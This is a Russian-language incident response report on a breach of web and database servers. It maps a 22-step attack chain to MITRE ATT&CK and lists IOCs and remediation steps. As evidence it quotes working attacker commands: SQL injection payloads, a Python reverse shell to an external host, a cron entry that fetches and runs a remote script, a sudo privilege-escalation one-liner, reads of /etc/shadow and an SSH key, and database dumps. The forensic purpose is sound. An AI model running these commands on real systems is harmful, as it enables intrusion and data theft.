# Отчёт об инциденте CASE-20260918-01

### Паспорт
- **Название:** Multi-Stage Server Breach: Web Exploit → Reverse Shell → PrivEsc → Lateral Movement → Exfiltration
- **Статус:** confirmed
- **Severity:** CRITICAL
- **Общая уверенность:** 98%
- **Хосты:** `db-prod-02`, `web-prod-01`
- **Учётные записи:** `backup_daemon`, `root`, `www-data`
- **Период событий:** 2026-09-18 08:45:00 – 2026-09-18 16:25:16 UTC
- **Источник:** `elasticsearch_export.json`
- **Покрытие:** 15000 событий; ошибок парсинга — 0, обнаружено звеньев цепи атаки — 22

---

### Резюме
🔴 **ПОДТВЕРЖДЕНО (CRITICAL):** Зафиксирована сквозная таргетированная атака на серверную инфраструктуру компании. Атакующий с внешнего IP **198.51.100[.]45** после предварительного сканирования эксплуатировал SQL-инъекцию, закрепился через Web Shell и Cron, повысил привилегии до `root`, похитил закрытый SSH-ключ, осуществил Lateral Movement на сервер баз данных и произвел эксфильтрацию дампа критических данных на внешний сервер **203.0.113[.]88**.

---

### Цепочка атаки (UTC)
**1. [2026-09-18 08:45:00 UTC]** — 🟢 `[web-prod-01]` **Reconnaissance:** Attacker scanned 103 sensitive endpoints (/phpmyadmin, /admin, /solr/, /wp-admin) with 404/403 responses `[T1595.002]`
**2. [2026-09-18 10:10:22 UTC]** — 🟢 `[web-prod-01]` **Initial Access:** GET /api/v1/products?id=1' OR '1'='1 (Status: 200) `[T1190]`
**3. [2026-09-18 10:12:44 UTC]** — 🟢 `[web-prod-01]` **Initial Access:** GET /api/v1/products?id=1 UNION SELECT null,version(),user()-- (Status: 200) `[T1190]`
**4. [2026-09-18 10:14:47 UTC]** — 🟢 `[web-prod-01]` **Initial Access:** GET /api/v1/products?id=1 UNION SELECT table_name,null,null FROM information_schema.tables-- (Status: 200) `[T1190]`
**5. [2026-09-18 10:16:21 UTC]** — 🟢 `[web-prod-01]` **Initial Access:** GET /api/v1/products?id=1 UNION SELECT username,password_hash,email FROM users WHERE is_admin=1-- (Status: 200) `[T1190]`
**6. [2026-09-18 10:25:00 UTC]** — 🟢 `[web-prod-01]` **Initial Access / Persistence:** POST /api/v1/upload_avatar.php?filename=shell_assets.php (Status: 200) `[T1505.003]`
**7. [2026-09-18 11:00:36 UTC]** — 🟢 `[web-prod-01]` **Discovery:** whoami `[T1033]`
**8. [2026-09-18 11:03:07 UTC]** — 🟢 `[web-prod-01]` **Discovery:** id `[T1033]`
**9. [2026-09-18 11:06:19 UTC]** — 🟢 `[web-prod-01]` **Discovery:** uname -a `[T1033]`
**10. [2026-09-18 11:09:29 UTC]** — 🟢 `[web-prod-01]` **Execution / C2:** python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("198.51.100.45",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' `[T1059.006]`
**11. [2026-09-18 11:15:20 UTC]** — 🟢 `[web-prod-01]` **Persistence:** crontab -l `[T1053.003]`
**12. [2026-09-18 11:18:22 UTC]** — 🟢 `[web-prod-01]` **Persistence:** echo '*/15 * * * * curl -s http://198.51.100.45/agent.sh | bash' >> /tmp/.cron_backup `[T1053.003]`
**13. [2026-09-18 12:49:13 UTC]** — 🟢 `[web-prod-01]` **Privilege Escalation:** sudo /usr/bin/find . -exec /bin/sh -p \; -quit `[T1548.003]`
**14. [2026-09-18 12:53:15 UTC]** — 🟢 `[web-prod-01]` **Credential Access:** cat /etc/shadow `[T1003.008]`
**15. [2026-09-18 12:57:24 UTC]** — 🟢 `[web-prod-01]` **Credential Access:** cat /root/.ssh/id_rsa `[T1552.004]`
**16. [2026-09-18 13:01:17 UTC]** — 🟢 `[web-prod-01]` **Persistence / Account Creation:** useradd -m -s /bin/bash -p '$6$hash$sysadmin' backup_daemon `[T1136.001]`
**17. [2026-09-18 14:30:36 UTC]** — 🟢 `[web-prod-01]` **Discovery:** nmap -sS -p 22,3306,5432 10.0.2.0/24 `[T1046]`
**18. [2026-09-18 14:38:36 UTC]** — 🟢 `[web-prod-01]` **Lateral Movement:** Lateral Movement Event: host=web-prod-01 -> target=10.0.2.20:22 cmd="ssh -i /tmp/stolen_id_rsa root@10.0.2.20" `[T1021.004]`
**19. [2026-09-18 14:46:31 UTC]** — 🟢 `[db-prod-02]` **Collection:** pg_dump -U postgres -d customer_vault -f /tmp/customers_dump.sql `[T1005]`
**20. [2026-09-18 14:54:40 UTC]** — 🟢 `[db-prod-02]` **Collection:** pg_dump -U postgres -d payment_gateway -f /tmp/payments_dump.sql `[T1005]`
**21. [2026-09-18 16:17:00 UTC]** — 🟢 `[db-prod-02]` **Collection / Staging:** tar -czf /tmp/vault_backup.tar.gz /tmp/*.sql `[T1560.001]`
**22. [2026-09-18 16:25:16 UTC]** — 🟢 `[web-prod-01]` **Exfiltration:** Suricata [Alert 1:2024001:1] High Volume Outbound HTTPS POST to Rare External IP 203.0.113.88 `[T1048]`

---

### MITRE ATT&CK Mapping
- **T1595.002 — Active Scanning: Vulnerability Scanning** — 🟢 ПОДТВЕРЖДЕНО: Attacker scanned 103 sensitive endpoints (/phpmyadmin, /admin, /solr/, /wp-admin) with 404/403 responses
- **T1190 — Exploit Public-Facing Application (SQLi)** — 🟢 ПОДТВЕРЖДЕНО: GET /api/v1/products?id=1' OR '1'='1 (Status: 200)
- **T1505.003 — Server Software Component: Web Shell** — 🟢 ПОДТВЕРЖДЕНО: POST /api/v1/upload_avatar.php?filename=shell_assets.php (Status: 200)
- **T1033 — System Owner/User Discovery** — 🟢 ПОДТВЕРЖДЕНО: whoami
- **T1059.006 — Command and Scripting Interpreter: Python Reverse Shell** — 🟢 ПОДТВЕРЖДЕНО: python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("198.51.100.45",4444));os.dup2(s.fileno(),0);os.
- **T1053.003 — Scheduled Task/Job: Cron** — 🟢 ПОДТВЕРЖДЕНО: crontab -l
- **T1548.003 — Abuse Elevation Control Mechanism: Sudo Caching / Abuse** — 🟢 ПОДТВЕРЖДЕНО: sudo /usr/bin/find . -exec /bin/sh -p \; -quit
- **T1003.008 — OS Credential Dumping: /etc/passwd and /etc/shadow** — 🟢 ПОДТВЕРЖДЕНО: cat /etc/shadow
- **T1552.004 — Unsecured Credentials: Private Keys** — 🟢 ПОДТВЕРЖДЕНО: cat /root/.ssh/id_rsa
- **T1136.001 — Create Account: Local Account** — 🟢 ПОДТВЕРЖДЕНО: useradd -m -s /bin/bash -p '$6$hash$sysadmin' backup_daemon
- **T1046 — Network Service Discovery** — 🟢 ПОДТВЕРЖДЕНО: nmap -sS -p 22,3306,5432 10.0.2.0/24
- **T1021.004 — Remote Services: SSH** — 🟢 ПОДТВЕРЖДЕНО: Lateral Movement Event: host=web-prod-01 -> target=10.0.2.20:22 cmd="ssh -i /tmp/stolen_id_rsa root@10.0.2.20"
- **T1005 — Data from Local System / Database Dump** — 🟢 ПОДТВЕРЖДЕНО: pg_dump -U postgres -d customer_vault -f /tmp/customers_dump.sql
- **T1560.001 — Archive Collected Data: Archive via Utility** — 🟢 ПОДТВЕРЖДЕНО: tar -czf /tmp/vault_backup.tar.gz /tmp/*.sql
- **T1048 — Exfiltration Over Alternative Protocol** — 🟢 ПОДТВЕРЖДЕНО: Suricata [Alert 1:2024001:1] High Volume Outbound HTTPS POST to Rare External IP 203.0.113.88

---

### IOC и артефакты
- **`198.51.100[.]45`** `[IPv4]` — Attacker / C2: Initial scanner, SQLi source, and reverse shell listener
- **`203.0.113[.]88`** `[IPv4]` — Exfiltration Destination: Destination for high-volume database archive outbound POST
- **`198.51.100.45`** `[src_ip]` — Reconnaissance: Observed in T1595.002 (web-prod-01)
- **`103`** `[probe_count]` — Reconnaissance: Observed in T1595.002 (web-prod-01)
- **`['/phpmyadmin', '/admin', '/solr/', '/wp-admin', '/api/debug']`** `[probed_paths]` — Reconnaissance: Observed in T1595.002 (web-prod-01)
- **`/api/v1/products`** `[path]` — Initial Access: Observed in T1190 (web-prod-01)
- **`/api/v1/upload_avatar.php?filename=shell_assets.php`** `[uri]` — Initial Access / Persistence: Observed in T1505.003 (web-prod-01)
- **`php-fpm`** `[parent]` — Discovery: Observed in T1033 (web-prod-01)
- **`198.51.100.45`** `[attacker_ip]` — Execution / C2: Observed in T1059.006 (web-prod-01)
- **`4444`** `[port]` — Execution / C2: Observed in T1059.006 (web-prod-01)
- **`/etc/shadow`** `[target_file]` — Credential Access: Observed in T1003.008 (web-prod-01)
- **`/root/.ssh/id_rsa`** `[target_key]` — Credential Access: Observed in T1552.004 (web-prod-01)
- **`backup_daemon`** `[created_user]` — Persistence / Account Creation: Observed in T1136.001 (web-prod-01)
- **`web-prod-01`** `[source_host]` — Lateral Movement: Observed in T1021.004 (web-prod-01)
- **`10.0.2.20:22`** `[target]` — Lateral Movement: Observed in T1021.004 (web-prod-01)
- **`/tmp/stolen_id_rsa`** `[key]` — Lateral Movement: Observed in T1021.004 (web-prod-01)
- **`/tmp/vault_backup.tar.gz`** `[archive_file]` — Collection / Staging: Observed in T1560.001 (db-prod-02)
- **`203.0.113.88`** `[dst_ip]` — Exfiltration: Observed in T1048 (web-prod-01)
- **`443`** `[port]` — Exfiltration: Observed in T1048 (web-prod-01)
- **`Suricata [Alert 1:2024001:1] High Volume Outbound HTTPS POST to Rare External IP 203.0.113.88`** `[alert]` — Exfiltration: Observed in T1048 (web-prod-01)
- **`backup_daemon`** `[Account]` — Backdoor Account: User account leveraged during attack
- **`root`** `[Account]` — Compromised Account: User account leveraged during attack
- **`www-data`** `[Account]` — Compromised Account: User account leveraged during attack

---

### Недостающие улики
- Memory snapshot (RAM) of web-prod-01 to recover active C2 socket / injected threads
- Target database transaction logs from db-prod-02 to measure exact table leakage extent
- PCAP capture of outbound traffic to 203.0.113.88 to inspect decrypted payloads
- Copies of files in /tmp/ (.cron_backup, stolen_id_rsa, customers_dump.sql, vault_backup.tar.gz) for SHA-256 hashing

---

### Рекомендации
#### Сдерживание (Containment)
- Isolate web-prod-01 (10.0.1.15) and db-prod-02 (10.0.2.20) from the corporate network at firewall level.
- Terminate active reverse shell process (PID 3110 / python3) and PHP-FPM worker sessions on web-prod-01.
- Block external IP 198.51.100.45 and exfiltration IP 203.0.113.88 on perimeter firewalls.

#### Устранение (Eradication)
- Remove rogue crontab entry and delete malicious file /tmp/.cron_backup on web-prod-01.
- Delete webshell /api/v1/upload_avatar.php / shell_assets.php from web directory.
- Delete unauthorized user account 'backup_daemon' from web-prod-01.
- Revoke compromised SSH private key (/root/.ssh/id_rsa) across all internal servers and rotate keys.
- Patch SQL injection vulnerability in /api/v1/products using parameterized queries.

#### Восстановление (Recovery)
- Rotate PostgreSQL database master passwords and root credentials.
- Audit database integrity on db-prod-02 against verified pre-attack backups.
- Deploy EDR agents across all production Linux servers and re-enable network interfaces.

---

### QA выводов
- Эксплуатация веб-приложения (SQLi / Web Shell) — **SUPPORTED**
- Повышение привилегий до root и хищение SSH-ключа — **SUPPORTED**
- Горизонтальное перемещение (Lateral Movement) на db-prod-02 — **SUPPORTED**
- Дамп и архивация баз данных — **SUPPORTED**
- Сетевая эксфильтрация данных наружу — **SUPPORTED**
